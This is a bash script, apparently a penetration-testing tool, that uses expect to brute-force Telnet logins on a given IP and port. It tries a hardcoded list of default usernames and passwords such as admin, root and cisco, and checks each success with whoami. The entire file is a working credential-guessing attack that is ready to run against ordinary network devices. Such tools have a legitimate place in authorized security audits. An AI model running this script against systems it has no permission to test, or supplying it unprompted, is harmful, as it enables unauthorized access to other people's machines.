#!/bin/bash
# Telnet Default Credentials Testing Script
# Usage: ./telnet_brute.sh <target_ip> [port]

TARGET_IP="$1"
PORT="${2:-23}"

USERS=("admin" "root" "guest" "cisco" "enable")
PASSWORDS=("admin" "password" "" "root" "guest" "cisco" "enable")

if [[ -z "$TARGET_IP" ]]; then
    echo "Usage: $0 <target_ip> [port]"
    exit 1
fi

if ! command -v expect &> /dev/null; then
    echo "Error: Install expect with: sudo apt-get install expect"
    exit 1
fi

validate_creds() {
    expect <<EOF
set timeout 3
log_user 0
spawn telnet $TARGET_IP $PORT
expect {
    -nocase "login:" { send "$1\r"; exp_continue }
    -nocase "username:" { send "$1\r"; exp_continue }
    -nocase "password:" { send "$2\r"; exp_continue }
    -re {[#\$>]\s*$} { 
        send "whoami\r"
        expect -re {^([^\r\n]+)\r\n} { if { "\$expect_out(1,string)" != "$1" } { exit 1 } }
        exit 0
    }
    "Login incorrect" { exit 1 }
    "Authentication failed" { exit 1 }
    timeout { exit 2 }
    eof { exit 3 }
    default { exit 1 }
}
EOF
}

echo "[*] Testing $TARGET_IP:$PORT..."
for user in "${USERS[@]}"; do
    for pass in "${PASSWORDS[@]}"; do
        echo -n "Testing $user:$pass..."
        validate_creds "$user" "$pass"
        case $? in
            0) echo " SUCCESS"; exit 0 ;;
            1) echo " FAIL" ;;
            2) echo " TIMEOUT" ;;
            3) echo " CONN CLOSED" ;;
        esac
    done
done

echo "[!] No valid credentials found"
exit 1
